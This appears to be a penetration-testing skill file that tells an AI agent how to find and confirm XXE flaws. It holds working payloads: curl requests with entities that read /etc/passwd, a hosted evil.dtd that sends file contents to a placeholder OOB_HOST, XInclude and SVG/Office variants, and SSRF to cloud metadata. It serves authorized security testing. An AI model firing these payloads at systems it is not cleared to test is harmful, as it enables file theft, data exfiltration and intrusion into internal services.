---
name: web-xxe
description: Use when an endpoint parses XML/SOAP/SVG/DOCX/XLSX — detect XXE, read files, OOB-exfil blind XXE; billion-laughs only if DoS is authorized. Class xxe.
---

# XML external entity (XXE) & XML attacks

Triggered anywhere XML is parsed (WSTG-INPV-07 · CWE-611 · OWASP A05:2021). Prove with a benign local-file read or an OOB callback. **Never** send a billion-laughs/entity-expansion payload unless the engagement explicitly authorizes DoS — record an `approval` blocker instead. Class `xxe`.

Per candidate: `record kind=hypothesis ... class=xxe outcome=testing`. **Try an entity against every endpoint that parses XML in any form** — including ones that look like JSON or file uploads. A parser you can't fully prove secure is `outcome=inconclusive` (surfaced by `recall gaps`), not a dropped lead.

## 1. Find XML sinks (enumerate all)
- Content types: `application/xml`, `text/xml`, `application/soap+xml`, `application/rss+xml`, `application/atom+xml`, `application/xhtml+xml`, `image/svg+xml`.
- File formats that are XML underneath: **SVG**, **DOCX/XLSX/PPTX** and ODF (zipped XML), `.xml`/`.plist`/`.rss`/`.atom`/`.xsl`/`.svg` imports, SAML assertions, SOAP/WSDL APIs, XML-RPC, sitemap/config uploads, EPUB/SVG in PDFs.
- Try flipping a JSON endpoint to XML: set `Content-Type: application/xml` and send an XML body — some parsers accept both. Also try adding a DOCTYPE to XML the app already accepts, and injecting entities into a single field.

## 2. Classic in-band file read
```bash
curl -s https://TARGET/api -H 'Content-Type: application/xml' --data-binary @- <<'XML'
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><name>&xxe;</name></root>
XML
```
Confirm: response echoes `/etc/passwd` contents (`root:x:0:0`). Windows: `file:///c:/windows/win.ini`. Directory listing: `file:///etc/` (Java). Also try `php://filter/convert.base64-encode/resource=...` (PHP, for binary/source), and `http://` to pivot (see §4).

## 3. Blind / OOB XXE (no reflection)
`OOB_HOST` is a callback host you control — a self-hosted interactsh or a private Burp Collaborator server. A public server receives whatever the payload exfiltrates, which on an engagement is client data.

Host a DTD on `OOB_HOST`, then trigger it:

```bash
# evil.dtd on OOB host:
# <!ENTITY % f SYSTEM "file:///etc/hostname">
# <!ENTITY % all "<!ENTITY exfil SYSTEM 'http://OOB_HOST/?x=%f;'>"> %all;
curl -s https://TARGET/api -H 'Content-Type: application/xml' --data-binary @- <<'XML'
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % dtd SYSTEM "http://OOB_HOST/evil.dtd"> %dtd; ]>
<r>&exfil;</r>
XML
```
A callback carrying the file contents = confirmed blind XXE. A DNS/HTTP hit alone (no data) still confirms external-entity resolution — record it (at least `inconclusive` if you can't yet exfil data), don't discard.

## 4. Variants (test each)
- **SVG upload → XXE / file read:** embed the DOCTYPE in an uploaded `.svg` the server rasterizes/parses.
- **Office/OOXML upload:** unzip a DOCX/XLSX, inject the DOCTYPE into `word/document.xml` / `xl/workbook.xml`, re-zip, upload.
- **XInclude** (when you control only part of the doc, no DOCTYPE): `<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></x>`.
- **SSRF via XXE:** `SYSTEM "http://169.254.169.254/..."` — pivots to the web-ssrf playbook (cloud metadata, internal services).
- **Parameter/error-based** exfil when OOB egress is blocked (leak file via a forced parse-error message).
- **SOAP/SAML:** inject entities into a SOAP body or a SAML assertion; **XSLT** external functions (`document()`) where XSLT is processed.

## 5. Billion laughs / entity expansion (DoS — authorization required)
Nested-entity expansion crashes the parser. This is destructive; only run it if DoS is authorized in scope. Otherwise: `record kind=blocker blockerType=approval question="Approve XML entity-expansion DoS PoC?" priority=low` and instead *note* that expansion limits appear absent as a lower-confidence (`inconclusive`) observation.

## Confirm vs false positive (calibrate, don't discard)
- A 500 on malformed XML is not XXE — but it's a lead (the parser ran). Require actual file contents in-band, or an OOB callback that resolves the external entity, before promoting to a finding.
- If external entities are demonstrably ignored (secure parser / `FEATURE_SECURE_PROCESSING`, entities disabled), record the hypothesis `refuted`. If you couldn't get a clean signal either way, keep it `inconclusive` and leave it in `recall gaps` — don't quit on it.

## Wire into the loop
```
record kind=hypothesis statement="/api XML parser resolves external entities" target=e8 class=xxe approach="file:///etc/passwd entity, check reflection" outcome=confirmed evidence=evidence/xxe-passwd.txt
record kind=finding title="XXE file read via SOAP endpoint" severity=high target=e8 class=xxe cwe=CWE-611 status=confirmed hypothesisId=y11 repro="POST XML with SYSTEM file:///etc/passwd entity" evidence=["evidence/xxe-passwd.txt"]
```
Severity: file read of secrets / SSRF-to-metadata via XXE = high/critical; OOB resolution with limited reach = medium; DoS-only = per engagement.

## References
- OWASP WSTG — Testing for XML Injection (incl. XXE) — WSTG-INPV-07 — https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection
- MITRE CWE-611: Improper Restriction of XML External Entity Reference — https://cwe.mitre.org/data/definitions/611.html
- OWASP Cheat Sheet — XML External Entity Prevention — https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- PortSwigger Web Security Academy — XXE injection — https://portswigger.net/web-security/xxe
